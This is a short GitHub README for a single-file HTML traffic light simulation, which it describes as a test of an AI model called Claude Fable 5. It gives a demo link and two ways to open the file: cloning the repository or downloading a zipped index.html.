# Claude Fable 5 Traffic Light Simulation

A small single-file traffic light simulation created as a test of Claude Fable 5. The simulation lives entirely in `index.html`.

![Traffic light simulation screenshot](assets/traffic-light-simulation.png)

## Demo

Watch the demo here: [X post](https://x.com/diegocabezas01/status/2065050163228426719?s=46&t=SsiRKZ2Q9HeqSo2ULlEsyg)

## How To Open It

Option 1: clone the repo (for experienced developers).

```bash
git clone https://github.com/diegocp01/fable-5-traffic-light-sim.git
cd fable-5-traffic-light-sim
```

Then open `index.html` in your browser.

Option 2: download only the HTML file (no Git required).

1. Click here to download [`index.html.zip`](https://github.com/diegocp01/fable-5-traffic-light-sim/raw/refs/heads/main/assets/index.html.zip).
2. Unzip it.
3. Open `index.html` from your Downloads folder in a browser.

No build step, install, or server is required. Just download and open the HTML file in a browser.
